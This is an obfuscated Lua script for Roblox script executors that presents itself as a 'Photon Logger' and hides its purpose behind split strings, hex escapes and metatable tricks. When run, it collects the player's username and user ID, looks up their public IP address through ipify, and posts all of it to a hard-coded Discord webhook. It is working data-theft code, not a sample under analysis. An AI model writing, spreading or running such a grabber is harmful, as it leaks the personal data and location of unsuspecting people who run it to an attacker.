we=true;unpack=(unpack)or(table["unpack"])qq={[1]=function()return"h".."ttps".."://".."api"..".ipify"..".org"end;[2]=nil;};setmetatable(qq,{__add=function(tt,vv)return tt[#tt+(vv-1)]end,__call=function(rt,fy)rt[fy[1]]=fy[2];end});qq[3]=(qq+2~=nil)or("\97");qq({5,(qq+3):gsub("a","Ph\x6ft\x6fn L\x6fgger")});ph=qq+(#{[[t4c-O]]}*5);co={}setmetatable(co,{__index=function(ew,pg)if(pg=="vx")then return(ph)end;end})qq[6]=co.vx;print(qq+6);
--// 🙂
if getgenv().ex == nil then getgenv().ex = true
local url = "h".."ttps://discord.com/api/webh\x6foks/1261085987413426198/kCT6oS1w3JxB1\x6fAqvW".."4BhtyT63QqBOPEmaiubgcpYe3LEKbXjVY7JGADy7xeq2qcyLWE"
local data = {
    ["embeds"] = {{
        ["author"] = {
            ["name"] = (qq+6).." | [Profile](h".."ttps://roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile)",
            ["icon_url"] = "h".."ttps://i.pinimg.com/736x/f4/30/75/f43075a7946a71f03759ce502d0a8a6d.jpg"
        },
        ["description"] = "",
        ["color"] = tonumber(0xFFFAFA),
        ["fields"] = {
            {
                ["name"] = ":bust_in_silhouette: Username",
                ["value"] = "```"..game.Players.LocalPlayer.Name.."```",
                ["inline"] = true
            },            
            {
                ["name"] = ":robot: IP",
                ["value"] = "```"..game:HttpGet((qq+1)()).."```",
                ["inline"] = true
            },
        },
    }},
}

request(
    {
        Url = url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(data)
    }
)
end
